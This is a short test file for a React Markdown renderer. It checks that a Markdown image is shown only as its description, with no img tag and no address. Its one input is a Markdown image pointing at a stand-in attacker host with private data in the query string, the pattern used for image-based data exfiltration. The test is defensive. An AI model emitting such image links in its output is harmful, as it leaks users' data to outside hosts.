import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { Markdown } from '../Markdown'

describe('Markdown', () => {
  it('shows a picture’s description and never loads its address', () => {
    const html = renderToStaticMarkup(<Markdown text="Look: ![a chart](https://evil.com/p.png?d=private)" />)
    expect(html).toContain('a chart')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('evil.com')
  })
})
